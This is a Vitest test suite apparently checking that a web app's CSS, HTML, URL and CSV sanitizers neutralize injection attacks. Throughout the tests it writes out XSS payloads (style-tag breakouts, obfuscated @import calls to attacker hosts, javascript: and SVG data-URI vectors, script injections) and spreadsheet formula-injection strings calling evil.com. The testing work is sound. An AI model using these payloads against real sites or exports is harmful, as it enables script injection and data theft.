import { describe, it, expect, vi, afterEach } from "vitest";
import DOMPurify from "dompurify";
import {
  sanitizeCss,
  sanitizeRichHtml,
  sanitizeEmailHtml,
  unwrapSanitizedEmailHtmlBlocks,
  buildSafePerPageBgCss,
  sanitizeHttpUrl,
  sanitizeEmailHref,
  validateUrl,
  sanitizeCsvCell,
  sanitizeCsvMinimalCell,
} from "../sanitize";
import { generateCsv } from "@/modules/venue/reports/src/utils/excelReportExport";
import { formatSafeCsvCell } from "@/modules/crm/reports/src/presentation/utils/crmReportsCsvExport";
import { escapeCsvCell } from "@/modules/shared/profile/core/src/presentation/utils/activity-csv.utils";
import { composePreviewDocument } from "@/modules/admin/communication/templates/src/presentation/components/templatePreviewHelpers";
import { DEFAULT_DESIGN } from "@/modules/admin/communication/templates/src/presentation/components/designVariablesTypes";

describe("Area B — CSS, HTML, URI & CSV XSS/injection hardening", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("neutralizes nested tag breakouts, hex escapes, comment splits, and unsafe url() in sanitizeCss", () => {
    const nestedBreakout = "</st</style>yle><svg onload=alert(1)>body{color:red}";
    const cleanNested = sanitizeCss(nestedBreakout);
    expect(cleanNested).not.toContain("<");
    expect(cleanNested).not.toContain(">");
    expect(cleanNested).toContain("body{color:red}");

    const obfuscated =
      "@\\69 mport url('https://evil.example/x.css'); " +
      "@\\i\\m\\p\\o\\r\\t \"https://attacker.example/exfil.css\"; " +
      "p{width:expre/**/ssion(alert(1));behavior:url(#default#time2);" +
      "background:\\u\\r\\l(javascript:alert(1));" +
      "list-style-image:u\\r\\l(javascript:alert(2));" +
      "content:'expre\\0a ssion(alert(3))';" +
      "color:expre\\09 ssion(alert(4));}";
    const cleanObfuscated = sanitizeCss(obfuscated);
    expect(cleanObfuscated.toLowerCase()).not.toContain("@import");
    expect(cleanObfuscated.toLowerCase()).not.toContain("expression(");
    expect(cleanObfuscated.toLowerCase()).not.toContain("behavior:");
    expect(cleanObfuscated.toLowerCase()).not.toContain("javascript:");
    expect(cleanObfuscated).not.toContain("\\");
    expect(cleanObfuscated).toContain("background:none");
    expect(cleanObfuscated).toContain("list-style-image:none");

    const valid = "body { color: #111827; background-image: url('/brand/hero.png'); }";
    expect(sanitizeCss(valid)).toContain("url('/brand/hero.png')");
  });

  it("sanitizes rich & email HTML fail-closed with safe URIs and mandatory rel=noopener noreferrer", () => {
    const payload =
      '<div style="background:url(javascript:alert(1))">' +
      '<a href="https://scripe.org/docs" target="_blank">Docs</a>' +
      '<a href="java\tscript:alert(1)">BadJs</a>' +
      '<a href="//evil.example/phish">ProtoRel</a>' +
      '<img src="https://cdn.scripe.org/logo.png" onerror="alert(1)">' +
      '<img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M0%200%22%2F%3E%3C%2Fsvg%3E" alt="Icon">' +
      '<img src="data:image/svg+xml,%3Csvg%20onload%3D%22alert(1)%22%3E%3C%2Fsvg%3E" alt="EvilSvg">' +
      '<img src="data:image/svg+xml,%3Csvg%3E%3Cuse%20href%3D%22javascript%3Aalert(1)%22%2F%3E%3C%2Fsvg%3E" alt="UseSvg">' +
      '<img src="data:image/svg+xml,%3Csvg%3E%3Ca%20xlink%3Ahref%3D%22%26%23x6a%3Bavascript%3Aalert(1)%22%3E%3Ccircle%20r%3D%2210%22%2F%3E%3C%2Fa%3E%3C%2Fsvg%3E" alt="EntitySvg">' +
      '<img src="data:image/svg+xml,%3Csvg%3E%3Canimate%20attributeName%3D%22href%22%20to%3D%22javascript%3Aalert(1)%22%2F%3E%3C%2Fsvg%3E" alt="AnimSvg">' +
      "<iframe src='https://evil.example'></iframe>" +
      "</div>";

    const emailClean = sanitizeEmailHtml(payload);
    const container = document.createElement("div");
    container.innerHTML = emailClean;

    const links = Array.from(container.querySelectorAll("a"));
    expect(links[0]?.getAttribute("href")).toBe("https://scripe.org/docs");
    expect(links[0]?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(links[1]?.hasAttribute("href")).toBe(false);
    expect(links[2]?.hasAttribute("href")).toBe(false);

    const imgs = Array.from(container.querySelectorAll("img"));
    expect(imgs[0]?.getAttribute("src")).toBe("https://cdn.scripe.org/logo.png");
    expect(imgs[0]?.hasAttribute("onerror")).toBe(false);
    expect(imgs[1]?.getAttribute("src")).toContain("data:image/svg+xml,");
    expect(imgs[2]?.hasAttribute("src")).toBe(false);
    expect(imgs[3]?.hasAttribute("src")).toBe(false);
    expect(imgs[4]?.hasAttribute("src")).toBe(false);
    expect(imgs[5]?.hasAttribute("src")).toBe(false);
    expect(container.querySelector("iframe")).toBeNull();
    expect(emailClean.toLowerCase()).not.toContain("javascript:");

    const richClean = sanitizeRichHtml('<a href="https://scripe.org" target="_blank">Ok</a>');
    expect(richClean).toContain('rel="noopener noreferrer"');

    vi.spyOn(DOMPurify, "isSupported", "get").mockReturnValue(false);
    expect(sanitizeRichHtml("<p>Hello</p>")).toBe("");
    expect(sanitizeEmailHtml("<p>Hello</p>")).toBe("");
  });

  it("unwraps TipTap email HTML blocks cleanly without retaining executable markup", () => {
    const rawBlock =
      '<table role="presentation"><tr><td><a href="javascript:alert(1)" target="_blank">Tap</a><script>alert(2)</script></td></tr></table>';
    const editorHtml = `<p>Intro</p><div data-email-html-block="true" data-email-html="${rawBlock.replace(/"/g, "&quot;")}"></div>`;
    const unwrapped = unwrapSanitizedEmailHtmlBlocks(editorHtml);

    expect(unwrapped).toContain("<p>Intro</p>");
    expect(unwrapped).toContain("<table");
    expect(unwrapped).not.toContain("<script");
    expect(unwrapped).not.toContain("javascript:");
  });

  it("validates http(s)/email URIs strictly and rejects breakout CSS in branding/template previews", () => {
    expect(validateUrl("javascript:alert(1)")).toBe(false);
    expect(validateUrl("data:text/html,<script>1</script>")).toBe(false);
    expect(validateUrl("https://admin.scripe.org/reports/1")).toBe(true);
    expect(sanitizeHttpUrl("/api/v1/downloads/1", { allowRelative: true })).toBe(
      "/api/v1/downloads/1"
    );
    expect(sanitizeHttpUrl("//evil.example", { allowRelative: true })).toBeNull();
    expect(sanitizeHttpUrl("/\\evil.example", { allowRelative: true })).toBeNull();
    expect(sanitizeEmailHref("mailto:support@scripe.org")).toBe("mailto:support@scripe.org");
    expect(sanitizeEmailHref("java\nscript:alert(1)")).toBeNull();

    const unsafeCss = buildSafePerPageBgCss("signup", {
      inheritBackground: false,
      bgType: "solid",
      bgColor: "red; } </style><script>alert(1)</script>",
    });
    expect(unsafeCss).toBe("");

    const validImgCss = buildSafePerPageBgCss("signup", {
      inheritBackground: false,
      bgType: "image",
      bgImageUrl: "https://cdn.scripe.org/bg.webp",
      bgImageFit: "cover",
      bgImagePosition: "center",
      bgOverlayEnabled: true,
      bgOverlayColor: "#0f172a",
      bgOverlayOpacity: 40,
    });
    expect(validImgCss).toContain("url('https://cdn.scripe.org/bg.webp')");
    expect(validImgCss).toContain("rgba(15,23,42,0.4)");

    const previewHtml = composePreviewDocument({
      debouncedBody: "<p>Hi</p><script>alert(1)</script>",
      previewDir: "ltr",
      previewLang: 'en"><script>alert(2)</script>',
      skin: { surface: "#0D0D0E", text: "#F7F8F5", link: "#C6FF00" },
      designVariables: {
        ...DEFAULT_DESIGN,
        backgroundColor: "#ffffff;}</style><script>alert(3)</script>",
        textColor: "#111111",
      },
    });
    expect(previewHtml).not.toContain("<script>");
    expect(previewHtml).toContain('lang="en"');
    expect(previewHtml).toContain("background: #0D0D0E;");
  });

  it("neutralizes spreadsheet formula injection (CWE-1236) across all CSV helpers", () => {
    const vectors = [
      "=CMD('calc')",
      "+1+1",
      "-1+1",
      "@SUM(1,2)",
      "\t=HYPERLINK(\"http://evil.com\")",
      "\uFEFF=1+1",
      " \r\n=1+1",
    ];
    for (const v of vectors) {
      expect(sanitizeCsvCell(v)).toBe(`"'${v.replace(/"/g, '""')}"`);
      expect(formatSafeCsvCell(v)).toBe(`"'${v.replace(/"/g, '""')}"`);
      expect(escapeCsvCell(v)).toBe(`"'${v.replace(/"/g, '""')}"`);
      expect(sanitizeCsvMinimalCell(v)).toBe(`"'${v.replace(/"/g, '""')}"`);
    }

    const csv = generateCsv({
      title: "Report",
      categoryName: "Venue",
      tenantName: "Ahly",
      filters: {},
      columns: [{ header: "Name", key: "name" }],
      data: [{ name: "=HYPERLINK(\"https://evil.example\",\"Click\")" }, { name: "SafeName" }],
    });
    expect(csv).toContain("\"'=HYPERLINK");
    expect(csv).toContain("\nSafeName");
  });
});
